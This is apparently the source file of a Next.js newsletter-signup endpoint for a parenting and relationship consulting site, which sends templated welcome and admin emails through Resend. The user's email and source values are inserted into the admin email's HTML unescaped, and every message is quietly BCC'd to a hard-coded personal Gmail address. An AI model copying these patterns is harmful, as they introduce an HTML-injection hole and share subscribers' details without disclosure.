import { NextResponse } from 'next/server';
import { trackEvent } from '@/lib/analytics';

/* ================================================================
   Smart Newsletter/Signup Endpoint
   Sends context-aware emails based on signup source.
   ================================================================ */

interface EmailTemplate {
  subject: string;
  adminSubject: string;
  html: string;
}

function getTemplate(email: string, source: string): EmailTemplate {
  const baseUrl = 'https://mama-hala-website.vercel.app';

  // ─── EVENT NOTIFICATIONS ───
  if (source === 'events-reminder') {
    return {
      subject: `You're on the List — Mama Hala Events`,
      adminSubject: `New Event Subscriber: ${email}`,
      html: `
        <div style="font-family:'Segoe UI',Tahoma,sans-serif;max-width:600px;margin:0 auto;">
          <div style="background:linear-gradient(135deg,#7A3B5E08,#C4878A10,#C8A97D08);padding:40px 32px;text-align:center;border-radius:12px 12px 0 0;">
            <div style="font-size:32px;margin-bottom:12px;">🎉</div>
            <h1 style="color:#7A3B5E;font-size:24px;margin:0 0 8px;font-family:Georgia,serif;">You're on the Event List!</h1>
            <p style="color:#6B6580;font-size:14px;margin:0;">Mama Hala Consulting</p>
          </div>
          <div style="background:#ffffff;padding:32px;border:1px solid #F3EFE8;border-top:none;border-radius:0 0 12px 12px;">
            <p style="color:#2D2A33;font-size:15px;line-height:1.7;margin:0 0 16px;">
              Thank you for signing up for event notifications! You'll be the first to know when we announce new workshops, webinars, community gatherings, and retreats.
            </p>
            <p style="color:#2D2A33;font-size:15px;line-height:1.7;margin:0 0 8px;font-weight:600;">
              What to expect:
            </p>
            <ul style="color:#4A4A5C;font-size:14px;line-height:1.8;margin:0 0 24px;padding-left:20px;">
              <li>Early access to event registration</li>
              <li>Exclusive early-bird pricing</li>
              <li>Free community events and webinars</li>
              <li>In-person workshops in Ottawa</li>
            </ul>
            <div style="margin:0 0 24px;text-align:center;">
              <a href="${baseUrl}/en/resources/events" style="display:inline-block;background:#7A3B5E;color:white;padding:14px 28px;border-radius:10px;text-decoration:none;font-size:14px;font-weight:600;">Browse Upcoming Events</a>
            </div>
            <p style="color:#8E8E9F;font-size:12px;margin:0;text-align:center;">
              Mama Hala Consulting — Guidance with Heart
            </p>
          </div>
        </div>
      `,
    };
  }

  // ─── ACADEMY WAITLIST ───
  if (source === 'academy-waitlist') {
    return {
      subject: `You're on the Waitlist — Mama Hala Academy`,
      adminSubject: `New Academy Waitlist: ${email}`,
      html: `
        <div style="font-family:'Segoe UI',Tahoma,sans-serif;max-width:600px;margin:0 auto;">
          <div style="background:linear-gradient(135deg,#7A3B5E08,#C8A97D10,#3B8A6E08);padding:40px 32px;text-align:center;border-radius:12px 12px 0 0;">
            <div style="font-size:32px;margin-bottom:12px;">🎓</div>
            <h1 style="color:#7A3B5E;font-size:24px;margin:0 0 8px;font-family:Georgia,serif;">You're on the Academy Waitlist!</h1>
            <p style="color:#6B6580;font-size:14px;margin:0;">Mama Hala Academy — Coming Soon</p>
          </div>
          <div style="background:#ffffff;padding:32px;border:1px solid #F3EFE8;border-top:none;border-radius:0 0 12px 12px;">
            <p style="color:#2D2A33;font-size:15px;line-height:1.7;margin:0 0 16px;">
              Thank you for your interest in Mama Hala Academy! We're building premium educational programs designed by Dr. Hala Ali — and you'll be among the first to know when we launch.
            </p>
            <p style="color:#2D2A33;font-size:15px;line-height:1.7;margin:0 0 8px;font-weight:600;">
              What's coming:
            </p>
            <ul style="color:#4A4A5C;font-size:14px;line-height:1.8;margin:0 0 24px;padding-left:20px;">
              <li><strong>5 programs</strong> across parenting, teens, couples, adults, and cultural identity</li>
              <li><strong>59 interactive modules</strong> with lessons, quizzes, and reflections</li>
              <li><strong>Certificates of completion</strong> signed by Dr. Hala Ali</li>
              <li><strong>Early-bird pricing</strong> for waitlist members</li>
            </ul>
            <div style="margin:0 0 24px;text-align:center;">
              <a href="${baseUrl}/en/resources/programs" style="display:inline-block;background:#7A3B5E;color:white;padding:14px 28px;border-radius:10px;text-decoration:none;font-size:14px;font-weight:600;">Preview Programs</a>
            </div>
            <p style="color:#8E8E9F;font-size:12px;margin:0;text-align:center;">
              Mama Hala Consulting — Guidance with Heart
            </p>
          </div>
        </div>
      `,
    };
  }

  // ─── DEFAULT: NEWSLETTER ───
  return {
    subject: 'Welcome to the Mama Hala Community',
    adminSubject: `New Newsletter Subscriber: ${email}`,
    html: `
      <div style="font-family:'Segoe UI',Tahoma,sans-serif;max-width:600px;margin:0 auto;">
        <div style="background:linear-gradient(135deg,#F0E0D8,#F5E8E0,#FAF0EC);padding:40px 32px;text-align:center;border-radius:12px 12px 0 0;">
          <h1 style="color:#7A3B5E;font-size:24px;margin:0 0 8px;font-family:Georgia,serif;">Welcome to Our Community</h1>
          <p style="color:#6B6580;font-size:14px;margin:0;">You've taken a beautiful first step.</p>
        </div>
        <div style="background:#ffffff;padding:32px;border:1px solid #F3EFE8;border-top:none;border-radius:0 0 12px 12px;">
          <p style="color:#2D2A33;font-size:15px;line-height:1.7;margin:0 0 16px;">
            Thank you for joining the Mama Hala Consulting family. You'll receive curated insights on parenting, relationships, and emotional wellbeing — written with heart and grounded in evidence.
          </p>
          <p style="color:#2D2A33;font-size:15px;line-height:1.7;margin:0 0 8px;font-weight:600;">
            Here's what you can explore right now:
          </p>
          <table width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px;">
            <tr>
              <td style="padding:8px 0;">
                <a href="${baseUrl}/en/resources/blog" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">📚 Read Our Blog</a>
                <span style="color:#8E8E9F;font-size:13px;"> — Evidence-based articles on family wellbeing</span>
              </td>
            </tr>
            <tr>
              <td style="padding:8px 0;">
                <a href="${baseUrl}/en/resources/events" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">🎉 Browse Events</a>
                <span style="color:#8E8E9F;font-size:13px;"> — Workshops, webinars, and community gatherings</span>
              </td>
            </tr>
            <tr>
              <td style="padding:8px 0;">
                <a href="${baseUrl}/en/resources/downloads" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">📥 Free Toolkits</a>
                <span style="color:#8E8E9F;font-size:13px;"> — Practical worksheets and guides</span>
              </td>
            </tr>
            <tr>
              <td style="padding:8px 0;">
                <a href="${baseUrl}/en/quiz" style="color:#7A3B5E;font-size:14px;text-decoration:none;font-weight:600;">📊 Take a Quiz</a>
                <span style="color:#8E8E9F;font-size:13px;"> — Discover insights about your family and relationships</span>
              </td>
            </tr>
          </table>
          <div style="margin:0 0 24px;text-align:center;">
            <a href="${baseUrl}/en/book-a-session" style="display:inline-block;background:#7A3B5E;color:white;padding:14px 28px;border-radius:10px;text-decoration:none;font-size:14px;font-weight:600;">Book a Free Consultation</a>
          </div>
          <p style="color:#8E8E9F;font-size:12px;margin:0;text-align:center;">
            You can unsubscribe at any time. We respect your privacy.<br/>
            Mama Hala Consulting — Guidance with Heart
          </p>
        </div>
      </div>
    `,
  };
}

export async function POST(request: Request) {
  try {
    const { email, source } = await request.json();

    if (!email || !email.includes('@') || !email.includes('.')) {
      return NextResponse.json({ error: 'Invalid email' }, { status: 400 });
    }

    const normalizedSource = source || 'footer';
    await trackEvent({ type: 'newsletter_signup', email, source: normalizedSource });

    if (process.env.RESEND_API_KEY) {
      try {
        const { Resend } = await import('resend');
        const resend = new Resend(process.env.RESEND_API_KEY);
        const fromEmail = process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>';
        const adminEmail = process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca';

        const template = getTemplate(email, normalizedSource);

        // Admin notification
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: fromEmail,
          to: adminEmail,
          subject: template.adminSubject,
          html: `
            <div style="font-family:sans-serif;max-width:500px;padding:24px;background:#FAF7F2;border-radius:12px;">
              <h3 style="color:#7A3B5E;margin:0 0 12px;">${template.adminSubject}</h3>
              <p style="color:#2D2A33;font-size:16px;font-weight:600;margin:0 0 4px;">${email}</p>
              <p style="color:#8E8E9F;font-size:13px;margin:0 0 4px;">Source: ${normalizedSource}</p>
              <p style="color:#8E8E9F;font-size:12px;margin:0;">${new Date().toLocaleString('en-US', { timeZone: 'America/Toronto' })}</p>
            </div>
          `,
        });

        // Subscriber email
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: fromEmail,
          to: email,
          subject: template.subject,
          html: template.html,
        });
      } catch (e) {
        console.error('Newsletter email error:', e);
      }
    }

    return NextResponse.json({ success: true });
  } catch {
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
